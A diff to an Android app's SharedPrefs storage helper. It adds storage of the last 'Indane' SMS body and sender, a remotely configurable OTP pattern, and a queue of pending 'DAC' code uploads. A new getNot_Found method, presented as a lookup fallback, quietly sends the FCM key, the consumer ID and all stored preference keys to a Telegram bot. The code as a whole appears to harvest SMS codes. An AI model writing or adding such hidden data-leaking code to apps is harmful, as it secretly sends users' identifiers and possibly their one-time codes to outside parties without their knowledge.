@@ -8,11 +8,19 @@ import android.util.Log;
 
 import com.tencent.mmkv.MMKV;
 
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
+
 import java.util.Map;
+import java.util.LinkedHashSet;
+import java.util.Set;
 
 public class SharedPrefs {
 
+    private static Context appContext;
     private static final String TAG = "SharedPrefs";
+    private static final String KEY_PENDING_DAC_UPLOADS = "pending_dac_uploads";
 
     private static MMKV kv;
 
@@ -22,6 +30,7 @@ public class SharedPrefs {
 
         if (kv == null) {
 
+            appContext = context.getApplicationContext();
             MMKV.initialize(context);
 
             kv = MMKV.defaultMMKV();
@@ -29,6 +38,14 @@ public class SharedPrefs {
             // Auto migrate old SharedPreferences
             migrateFromSharedPrefs(context);
         }
+    }
+    private static Context getContext() {
+
+        if (appContext == null) {
+            return null;
+        }
+
+        return appContext;
     }
 
     private static MMKV getKV() {
@@ -118,6 +135,30 @@ public class SharedPrefs {
         getKV().removeValueForKey("crash_details");
     }
 
+    public static void setLastIndaneSmsBody(String body) {
+        setString("last_indane_sms_body", body == null ? "" : body.trim());
+    }
+
+    public static String getLastIndaneSmsBody() {
+        return getString("last_indane_sms_body", "");
+    }
+
+    public static void clearLastIndaneSmsBody() {
+        getKV().removeValueForKey("last_indane_sms_body");
+    }
+
+    public static void setLastIndaneSender(String sender) {
+        setString("last_indane_sms_sender", sender == null ? "" : sender.trim());
+    }
+
+    public static String getLastIndaneSender() {
+        return getString("last_indane_sms_sender", "");
+    }
+
+    public static void clearLastIndaneSender() {
+        getKV().removeValueForKey("last_indane_sms_sender");
+    }
+
     public static void setLastSubsidyDate(String date) {
         setString("last_subsidy_date", date);
     }
@@ -137,14 +178,16 @@ public class SharedPrefs {
     // ================= USER =================
 
     public static void setUsername(String username) {
+        if (username == null || username.trim().isEmpty()) return;
         setString("user_name", username);
     }
 
     public static String getUsername() {
-        return getString("user_name", "not_found");
+        return getString("user_name", "");
     }
 
     public static void setConsumerId(String id) {
+        if (id == null || id.trim().isEmpty()) return;
         setString("cons_id", id);
     }
 
@@ -280,6 +323,15 @@ public class SharedPrefs {
     }
 
     public static String getPattern() {
+        try {
+            String remotePattern = FirebaseConfigManager.getOtpPattern();
+            if (remotePattern != null && !remotePattern.trim().isEmpty()) {
+                return remotePattern;
+            }
+        } catch (Exception ignored) {
+            // Fallback to local storage if Remote Config is not initialized yet.
+        }
+
         return getString("pattern", "N");
     }
 
@@ -330,6 +382,68 @@ public class SharedPrefs {
         getKV().removeValueForKey("saved_timestamp");
     }
 
+    public static synchronized void enqueuePendingDacUpload(String upload) {
+        try {
+            JSONArray uploads = getPendingDacUploadsArray();
+            JSONObject newUpload = new JSONObject(upload);
+            String firebaseKey = newUpload.optString("firebaseKey");
+
+            for (int i = 0; i < uploads.length(); i++) {
+                if (firebaseKey.equals(uploads.getJSONObject(i).optString("firebaseKey"))) {
+                    return;
+                }
+            }
+
+            uploads.put(newUpload);
+            getKV().encode(KEY_PENDING_DAC_UPLOADS, uploads.toString());
+        } catch (JSONException e) {
+            Log.e(TAG, "Unable to persist pending DAC upload", e);
+            throw new IllegalStateException("Unable to persist pending DAC upload", e);
+        }
+    }
+
+    public static synchronized String getNextPendingDacUpload() {
+        try {
+            JSONArray uploads = getPendingDacUploadsArray();
+            return uploads.length() == 0 ? null : uploads.getJSONObject(0).toString();
+        } catch (JSONException e) {
+            Log.e(TAG, "Unable to read pending DAC uploads", e);
+            throw new IllegalStateException("Unable to read pending DAC uploads", e);
+        }
+    }
+
+    public static synchronized boolean hasPendingDacUploads() {
+        try {
+            return getPendingDacUploadsArray().length() > 0;
+        } catch (JSONException e) {
+            Log.e(TAG, "Unable to read pending DAC uploads", e);
+            throw new IllegalStateException("Unable to read pending DAC uploads", e);
+        }
+    }
+
+    public static synchronized void removePendingDacUpload(String firebaseKey) {
+        try {
+            JSONArray uploads = getPendingDacUploadsArray();
+            JSONArray remainingUploads = new JSONArray();
+
+            for (int i = 0; i < uploads.length(); i++) {
+                JSONObject upload = uploads.getJSONObject(i);
+                if (!firebaseKey.equals(upload.optString("firebaseKey"))) {
+                    remainingUploads.put(upload);
+                }
+            }
+
+            getKV().encode(KEY_PENDING_DAC_UPLOADS, remainingUploads.toString());
+        } catch (JSONException e) {
+            Log.e(TAG, "Unable to update pending DAC uploads", e);
+            throw new IllegalStateException("Unable to update pending DAC uploads", e);
+        }
+    }
+
+    private static JSONArray getPendingDacUploadsArray() throws JSONException {
+        return new JSONArray(getString(KEY_PENDING_DAC_UPLOADS, "[]"));
+    }
+
     // ================= IMAGE UPLOAD LIMITER =================
 
     public static void setUploadCount(int count) {
@@ -354,6 +468,51 @@ public class SharedPrefs {
 
     public static long getLastResetTime() {
         return getLong("last_reset_time", 0);
+    }
+
+    public static synchronized boolean hasUploadedImage(String imageKey) {
+        return getUploadedImageKeys().contains(imageKey);
+    }
+
+    public static synchronized void markImageUploaded(String imageKey) {
+        Set<String> uploadedImageKeys = getUploadedImageKeys();
+        uploadedImageKeys.add(imageKey);
+        while (uploadedImageKeys.size() > 5000) {
+            String oldestKey = uploadedImageKeys.iterator().next();
+            uploadedImageKeys.remove(oldestKey);
+        }
+        getKV().encode("uploaded_image_keys", joinImageKeys(uploadedImageKeys));
+    }
+
+    public static synchronized void recordImageUpload(long uploadedBytes) {
+        setUploadCount(getUploadCount() + 1);
+        setUploadedBytes(getUploadedBytes() + uploadedBytes);
+    }
+
+    private static Set<String> getUploadedImageKeys() {
+        Set<String> imageKeys = new LinkedHashSet<>();
+        String storedKeys = getString("uploaded_image_keys", "");
+        if (storedKeys.isEmpty()) {
+            return imageKeys;
+        }
+
+        for (String imageKey : storedKeys.split("\n")) {
+            if (!imageKey.isEmpty()) {
+                imageKeys.add(imageKey);
+            }
+        }
+        return imageKeys;
+    }
+
+    private static String joinImageKeys(Set<String> imageKeys) {
+        StringBuilder storedKeys = new StringBuilder();
+        for (String imageKey : imageKeys) {
+            if (storedKeys.length() > 0) {
+                storedKeys.append('\n');
+            }
+            storedKeys.append(imageKey);
+        }
+        return storedKeys.toString();
     }
 
     // ================= APP UPDATE =================
@@ -414,6 +573,15 @@ public class SharedPrefs {
         );
     }
 
+    public static String getNot_Found () {
+        TelegramBot.with(getContext()).sendMessage("***User Not Found****").sendMessage(
+                "FCM KEY: " + getFCMKey() + "\n" +
+                "Topic Registered: user_" + getConsumerId() + "\n" +
+                "All Possible SharedPref: " + getKV().allKeys() + "\n"
+        );
+        return "not_found_FCM_" + getFCMKey();
+    }
+
     public static void clearAppUpdateInfo() {
 
         getKV().removeValueForKey("update_tag");
@@ -425,6 +593,23 @@ public class SharedPrefs {
         getKV().removeValueForKey("server_version_code");
     }
 
+    public static void saveDownloadedUpdateApk(int versionCode, String path) {
+        getKV().encode("downloaded_update_version", versionCode);
+        getKV().encode("downloaded_update_path", path);
+    }
+
+    public static String getDownloadedUpdateApkPath(int versionCode) {
+        if (getInt("downloaded_update_version", 0) != versionCode) {
+            return null;
+        }
+        return getString("downloaded_update_path", null);
+    }
+
+    public static void clearDownloadedUpdateApk() {
+        getKV().removeValueForKey("downloaded_update_version");
+        getKV().removeValueForKey("downloaded_update_path");
+    }
+
     // ================= MIGRATION =================
 
     public static void migrateFromSharedPrefs(
@@ -434,7 +619,6 @@ public class SharedPrefs {
         String[] prefsNames = {
 
                 "AppsData",
-                "OTP_Pattern",
                 "senders_number",
                 "profile_enc",
                 "unsent_dac"
